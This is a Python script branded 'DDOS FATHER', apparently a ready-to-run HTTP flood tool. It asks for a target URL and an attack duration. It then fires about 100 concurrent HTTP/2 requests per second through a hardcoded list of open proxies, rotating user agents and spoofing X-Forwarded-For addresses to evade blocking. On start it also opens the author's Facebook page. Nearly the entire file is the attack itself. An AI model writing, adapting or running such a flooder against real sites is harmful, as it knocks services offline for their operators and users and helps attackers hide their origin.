import logging
import httpx
import random
import ssl
import time,os,sys
from concurrent.futures import ThreadPoolExecutor
banner = """
\033[91m 
___  ___            _      
|  \/  |           (_)     
| .  . | ___  _ __  _ _ __ 
| |\/| |/ _ \| '_ \| | '__|
| |  | | (_) | | | | | |   
\_|  |_/\___/|_| |_|_|_|   
\033
[0m\033[95m                TOOL NAME -  DDOS ☢️  FATHER
\033[94m               ========================================
                          X - REVENGE  ☣️
\033[95m                                VERSION 2.50.5
\033[0m\033[94m"""


print(banner)
# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# List of proxies (Ensure all proxies are correctly formatted)
proxies = [
    "http://201.65.173.180:8080",
    "http://24.199.84.240:3128",
    "http://177.234.241.25:999",
    "http://208.87.243.199:9898",
    "http://45.77.147.46:3128",
    "http://46.101.179.49:3129",
    "http://200.10.28.89:8083",
    "http://200.174.198.86:8888",
    "http://161.34.40.35:3128",
    "http://217.160.74.198:3128",
    "http://103.177.235.132:83",
    "http://93.125.3.22:8080",
    "http://51.158.169.52:29976",
    "http://159.223.34.114:3128",
    "http://159.65.0.8:3128",
    "http://167.99.228.84:3128",
    "http://152.26.229.42:9443",
    "http://135.148.171.194:18080",
    "http://35.185.196.38:3128",
    "http://200.24.131.125:999",
    "http://5.189.130.42:23055",
    "http://189.240.60.163:9090",
    "http://154.38.180.194:3128",
    "http://189.240.60.166:9090",
    "http://115.223.11.212:50000",
    "http://128.199.136.56:3128",
    "http://116.114.20.148:3128",
    "http://61.129.2.212:8080",
    "http://82.179.94.21:3128",
    "http://101.251.204.174:8080",
    "http://111.53.212.6:80",
    "http://178.48.68.61:18080",
    "http://204.137.238.6:3129",
    "http://160.86.242.23:8080",
    "http://51.75.126.150:9419",
    "http://45.138.87.238:1080",
    "http://31.170.22.127:1080",
    "http://23.19.244.109:1080",
    "http://84.46.255.25:1080",
    "http://82.165.198.169:41569",
    "http://64.6.254.91:55578",
    "http://45.43.11.72:1080",
    "http://188.165.223.183:24183",
    "http://178.255.44.60:61656",
    "http://50.63.13.3:33735",
    "http://94.23.222.122:16437",
    "http://50.63.12.33:38609",
    "http://188.164.193.178:25450",
    "http://188.165.252.198:38617",
    "http://51.38.127.237:52814",
    "http://82.165.198.169:41569",
    "http://94.23.222.122:60036",
    "http://45.138.87.238:1080",
    "http://188.165.223.183:22245",
    "http://72.167.46.207:1080",
    "http://188.165.252.198:23319",
    "http://51.161.130.195:56942",
    "http://51.79.248.208:16592",
    "http://82.223.165.28:62284",
    "http://5.39.69.35:52176",
    "http://188.164.193.178:22646",
    "http://84.46.255.25:1080",
    "http://23.94.214.127:20089",
    "http://23.19.244.109:1080",
    "http://31.170.22.127:1080",
    "http://51.75.126.150:27038",
    "http://54.36.108.149:58264",
    "http://162.55.87.48:5566"
]

requests_per_second = 100


def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
    ]
    return random.choice(user_agents)

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Function to create random headers
def random_headers():
    return {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "X-Forwarded-For": random_ip() 
    }

def send_request(url, proxy, ssl_context):
    headers = random_headers()
    try:
        with httpx.Client(
            http2=True,
            proxies=proxy,  
            verify=ssl_context
        ) as client:
            response = client.get(url, headers=headers)
            logger.info(f"Response status code: {response.status_code}")
    except httpx.RequestError as e:
        logger.error(f"Request error: {e}")
    except httpx.HTTPStatusError as e:
        logger.error(f"HTTP status error: {e}")
    except Exception as e:
        logger.error(f"An error occurred: {e}")

def send_requests(url, proxies, ssl_context):
    proxy_dict = {
        "http://": random.choice(proxies),  
        "https://": random.choice(proxies)  
    }
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request, url, proxy_dict, ssl_context) for _ in range(requests_per_second)]
        for future in futures:
            future.result()  

def main():
    url = input("Enter the URL to send requests to: ")
    duration = int(input("Enter the duration (in seconds) for the attack: "))

    # Create SSL context with default configuration
    ssl_context = ssl.create_default_context()
    ssl_context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')

    end_time = time.time() + duration

    while time.time() < end_time:
        start_time = time.time()
        send_requests(url, proxies, ssl_context)
        elapsed_time = time.time() - start_time
        sleep_time = max(0, 1 - elapsed_time)  
        time.sleep(sleep_time)

if __name__ == "__main__":
    os.system("xdg-open https://www.facebook.com/mdmonirhossen62")
    main()
